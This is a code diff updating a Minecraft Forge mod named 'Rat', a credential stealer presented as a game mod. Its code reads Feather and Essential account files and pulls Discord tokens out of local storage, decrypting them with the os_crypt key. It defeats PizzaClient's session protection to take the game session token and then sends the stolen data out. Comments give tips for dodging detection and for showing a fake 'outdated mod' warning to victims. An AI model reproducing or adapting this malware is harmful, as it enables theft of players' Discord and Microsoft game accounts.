@@ -8,6 +8,7 @@ import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.event.entity.EntityJoinWorldEvent;
 import net.minecraftforge.fml.common.Loader;
 import net.minecraftforge.fml.common.Mod;
+import net.minecraftforge.fml.common.ObfuscationReflectionHelper;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.relauncher.ReflectionHelper;
@@ -32,7 +33,7 @@ import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-@Mod(modid = "") //change this because hypixel doesn't like empty modids
+@Mod(modid = "null") //change this because forge/hypixel doesn't like empty modids
 public class Rat { //change class name please for the love of god
 
     @Mod.EventHandler
@@ -55,18 +56,18 @@ public class Rat { //change class name please for the love of god
                 
                 //"if u swap these files with yours, you get infinite access to victims accounts"      -Annah#5795
                 //apparently doesn't work lol
-                if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
-                    feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
+                if (Files.exists(Paths.get(mc.gameDir.getParent(), ".feather/accounts.json"))) {
+                    feather = Files.readAllLines(Paths.get(mc.gameDir.getParent(), ".feather/accounts.json")).toString();
                 }
 
-                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json"))) {
-                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json")).toString();
+                if (Files.exists(Paths.get(mc.gameDir.getPath(), "essential/microsoft_accounts.json"))) {
+                    essentials = Files.readAllLines(Paths.get(mc.gameDir.getPath(), "essential/microsoft_accounts.json")).toString();
                 }
 
                 //discord tokens
-                if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb"))) {
+                if (Files.isDirectory(Paths.get(mc.gameDir.getParent(), "discord/Local Storage/leveldb"))) {
                     discord = "";
-                    for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles())) {
+                    for (File file : Objects.requireNonNull(Paths.get(mc.gameDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles())) {
                         if (file.getName().endsWith(".ldb")) {
                             FileReader fr = new FileReader(file);
                             BufferedReader br = new BufferedReader(fr);
@@ -113,7 +114,7 @@ public class Rat { //change class name please for the love of god
 
                                     //get, decode and decrypt key
                                     byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
-                                    JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State"))), JsonObject.class);
+                                    JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.gameDir.getParent(), "discord/Local State"))), JsonObject.class);
                                     key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                                     key = Base64.getDecoder().decode(key);
                                     key = Arrays.copyOfRange(key, 5, key.length);
@@ -140,7 +141,7 @@ public class Rat { //change class name please for the love of god
 
                 //pizzaclient bypass
                 if (Loader.isModLoaded("pizzaclient")) {
-                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+                    token = (String) ObfuscationReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                 }
 
                 //send req
@@ -168,7 +169,7 @@ public class Rat { //change class name please for the love of god
     @SubscribeEvent
     public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
         //send and unregister when player joins
-        if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
+        if (e.getEntity().equals(Minecraft.getMinecraft().player)) {
             //do something here (ex: play the "outdated mod" card)
 //            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
             MinecraftForge.EVENT_BUS.unregister(this);
